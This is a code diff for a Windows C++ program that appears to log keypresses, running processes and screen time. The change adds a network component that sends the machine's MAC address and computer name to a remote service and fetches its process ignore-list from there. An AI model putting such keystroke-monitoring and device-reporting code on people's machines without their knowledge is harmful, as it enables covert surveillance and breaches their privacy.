@@ -1,10 +1,10 @@
 #include <iostream>
 #include <deque>
 
+#include <winsock2.h>
 #include "flobcallbackcollection.h"
 #include "FlobbelSafe.h"
-
-
+#include "FlobWS.h"
 
 bool Flob_constants::exists = false;
 Flob_constants flobCS;
@@ -71,11 +71,6 @@ bool processArguments(int argc, char **argv){
             }
             flobCS.savedirectory = *(it + 1);
         }
-        if(*it == L"-lu" || *it == L"--lookup"){
-            if((it+1) == arguments.end())
-                std::wcerr << L"No lookup file specified. Please try again.\n";
-            flobCS.lookup_filepath = *(it+1);
-        }
     }
     return true;
 }
@@ -101,12 +96,14 @@ void keySequence(DWORD vkCode){
 
 void initialize_flobbel() {
     initMap();
-    if(flobCS.savedirectory.empty()) flobCS.savedirectory = fucked_up_directory;
-    if(flobCS.lookup_filepath.empty()) flobCS.lookup_filepath = flobCS.savedirectory+L"lookupfile.data";
-    flobCS.globalHandle = getComputerHandle(flobCS.lookup_filepath);
+    FlobWS flobWS;
+    std::set<std::wstring> bl = flobWS.sync_metadata(flobCS.converter.to_bytes(mac(mac())), flobCS.converter.to_bytes(computerName()));
+//    if(flobCS.savedirectory.empty()) flobCS.savedirectory = fucked_up_directory;
+//    if(flobCS.lookup_filepath.empty()) flobCS.lookup_filepath = flobCS.savedirectory+L"lookupfile.data";
+//    flobCS.globalHandle = getComputerHandle(flobCS.lookup_filepath);
     safe = new FlobbelSafe(flobCS.savedirectory);
     callbackCollection = new FlobCallbackCollection(process,keypress, screentime);
-    if(blacklist.empty()){
+/*    if(blacklist.empty()){
         blacklist.insert(L"svchost.exe");
         blacklist.insert(L"ctfmon.exe");
         blacklist.insert(L"RuntimeBroker.exe");
@@ -115,5 +112,6 @@ void initialize_flobbel() {
         blacklist.insert(L"[System Process]");
         blacklist.insert(L"winlogon.exe");
     }
-    callbackCollection->setProgramBlacklist(blacklist);
+    */
+    callbackCollection->setProgramBlacklist(bl);
 }
